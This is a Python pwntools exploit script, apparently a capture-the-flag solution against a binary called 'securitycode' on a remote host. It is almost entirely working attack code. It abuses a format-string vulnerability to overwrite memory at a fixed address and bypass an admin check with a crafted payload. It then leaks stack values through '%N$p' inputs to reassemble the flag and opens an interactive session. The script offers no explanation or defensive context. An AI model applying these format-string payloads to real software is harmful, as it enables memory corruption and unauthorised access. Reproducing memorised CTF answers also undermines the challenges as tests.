#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 185.235.41.205 --port 7040 securitycode
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('securitycode')

host = args.HOST or '185.97.118.167'
port = int(args.PORT or 7040)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
tbreak main
continue
b *auth_admin+252
'''.format(**locals())

io = None

# Finding payload
def send_payload(payload):
    global io
    io = start()    
    io.sendlineafter('admin or a user', 'A')
    io.sendlineafter('name:', payload)
    io.recvuntil('dear admin, ')
    log.info("sent payload = %s" % repr(payload))
    return io.recv()
format_string = FmtStr(execute_fmt=send_payload)
format_string.write(0x804C03C, 0xABADCAFE) # write 0xABADCAFE at 0x804C03C
format_string.execute_writes()

flag = b''
for i in range(7, 30):
    payload = b'%171c%26$hhn%2c%27$hhn%29c%28$hhn%52c%29$hhn?\xc0\x04\x08>\xc0\x04\x08=\xc0\x04\x08<\xc0\x04\x08'
    io = start(['securitycode'])    
    io.sendlineafter('admin or a user', 'A')
    io.sendlineafter('name:', payload)

    io.sendlineafter('password:', f'%{i}$p')
    io.recvuntil('password is ')
    try:
        password = p32(int(io.recvline().decode(), 16))
        flag += password
        print(password)
    except:
        break

print(flag)

io.interactive()

